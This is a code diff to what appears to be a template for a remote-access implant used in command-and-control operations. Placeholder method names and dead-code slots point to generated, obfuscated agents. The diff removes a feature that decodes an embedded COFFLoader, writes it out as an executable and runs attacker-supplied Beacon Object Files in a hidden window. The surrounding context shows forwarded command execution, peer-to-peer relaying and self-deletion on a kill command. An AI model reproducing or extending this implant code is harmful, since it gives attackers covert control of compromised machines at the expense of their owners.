@@ -46,8 +46,6 @@ except:
 
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-COFF_LOADER_B64 = "{v_coffloader_b64}"
-
 {dead_code_1}
 
 class {class_name}:
@@ -915,101 +913,6 @@ class {class_name}:
         except Exception as e:
             return f"[ERROR] Failed to execute forwarded command: {{str(e)}}"
 
-    def {m_load_coffloader}(self):
-        
-        if COFF_LOADER_B64 and COFF_LOADER_B64.strip():
-            try:
-                coffloader_bytes = base64.b64decode(COFF_LOADER_B64.strip())
-                return coffloader_bytes
-            except Exception as e:
-                pass
-        
-        try:
-            script_dir = os.path.dirname(os.path.abspath(__file__))
-            inline_path = os.path.join(script_dir, 'inline.txt')
-            
-            with open(inline_path, 'r') as f:
-                encoded_coffloader = f.read().strip()
-            
-            if not encoded_coffloader:
-                raise ValueError("inline.txt is empty")
-            
-            coffloader_bytes = base64.b64decode(encoded_coffloader)
-            return coffloader_bytes
-        except FileNotFoundError:
-            raise FileNotFoundError("inline.txt not found in agent directory and no embedded COFFLoader")
-        except Exception as e:
-            raise Exception(f"Could not load COFFLoader: {{str(e)}}")
-
-    def {m_execute_bof}(self, bof_data, args=""):
-        try:
-            try:
-                coffloader_bytes = self.{m_load_coffloader}()
-            except Exception as e:
-                return f"[ERROR] Could not load COFFLoader: {{str(e)}}"
-            
-            if not bof_data:
-                return "[ERROR] No BOF data provided"
-            
-            import tempfile
-            import os
-            import subprocess
-            
-            with tempfile.NamedTemporaryFile(delete=False, suffix='.exe') as temp_loader:
-                temp_loader.write(coffloader_bytes)
-                temp_loader.flush()
-                temp_loader_path = temp_loader.name
-
-            try:
-                bof_bytes = base64.b64decode(bof_data)
-                with tempfile.NamedTemporaryFile(delete=False, suffix='.o') as temp_bof:
-                    temp_bof.write(bof_bytes)
-                    temp_bof.flush()
-                    temp_bof_path = temp_bof.name
-            except Exception as e:
-                return f"[ERROR] Invalid BOF data format: {{str(e)}}"
-
-            try:
-                # The 'go' parameter is the entry point required for all BOFs
-                cmd = [temp_loader_path, 'go', temp_bof_path]
-                if args:
-                    import shlex
-                    try:
-                        arg_list = shlex.split(args)
-                        cmd.extend(arg_list)
-                    except:
-                        cmd.extend(args.split())
-                
-                result = subprocess.run(
-                    cmd,
-                    capture_output=True,
-                    text=True,
-                    timeout=30,
-                    creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0  # Hide window on Windows
-                )
-                
-                output = result.stdout
-                if result.stderr:
-                    output += "\nSTDERR: " + result.stderr
-                
-                if result.returncode != 0:
-                    output += f"\n[RETURN CODE: {{result.returncode}}]"
-                
-                return output if output else "[BOF executed successfully - no output]"
-                
-            except subprocess.TimeoutExpired:
-                return "[ERROR] BOF execution timed out after 30 seconds"
-            except Exception as e:
-                return f"[ERROR] BOF execution failed: {{str(e)}}"
-            finally:
-                try:
-                    os.unlink(temp_loader_path)
-                    os.unlink(temp_bof_path)
-                except:
-                    pass  # Best effort cleanup
-        except Exception as e:
-            return f"[ERROR] Failed to execute BOF: {{str(e)}}"
-
 
     def {m_handle_upload}(self, command):
         try:
@@ -1154,17 +1057,6 @@ class {class_name}:
                                     result = "[ERROR] Unknown P2P command: " + str(p2p_cmd) + ". Available: list, forward <addr> <command>, discover"
                         except Exception as e:
                             result = f"[ERROR] P2P command failed: {{str(e)}}"
-                    elif command.startswith('bof '):
-                        try:
-                            parts = command.split(' ', 2)  # Split into at most 3 parts: ['bof', 'encoded_bof', 'args']
-                            if len(parts) < 2:
-                                result = "[ERROR] Invalid BOF command format. Usage: bof <base64_encoded_bof> [args...]"
-                            else:
-                                encoded_bof = parts[1]
-                                bof_args = parts[2] if len(parts) > 2 else ""
-                                result = self.{m_execute_bof}(encoded_bof, bof_args)
-                        except Exception as e:
-                            result = f"[ERROR] Failed to execute BOF command: {{str(e)}}"
                     else:
                         result = self.{m_exec}(command)
                     self.{m_submit_interactive_result}(task_id, result)
@@ -1298,18 +1190,6 @@ class {class_name}:
                                         result = "[ERROR] Unknown P2P command: " + str(p2p_cmd) + ". Available: list, forward <addr> <command>, discover"
                             except Exception as e:
                                 result = f"[ERROR] P2P command failed: {{str(e)}}"
-                        elif command.startswith('bof '):
-                            # format: "bof <base64_encoded_bof> [args...]"
-                            try:
-                                parts = command.split(' ', 2)  # Split into at most 3 parts: ['bof', 'encoded_bof', 'args']
-                                if len(parts) < 2:
-                                    result = "[ERROR] Invalid BOF command format. Usage: bof <base64_encoded_bof> [args...]"
-                                else:
-                                    encoded_bof = parts[1]
-                                    bof_args = parts[2] if len(parts) > 2 else ""
-                                    result = self.{m_execute_bof}(encoded_bof, bof_args)
-                            except Exception as e:
-                                result = f"[ERROR] Failed to execute BOF command: {{str(e)}}"
                         elif command.startswith('kill'):
                             self.{m_self_delete}()
                         else:
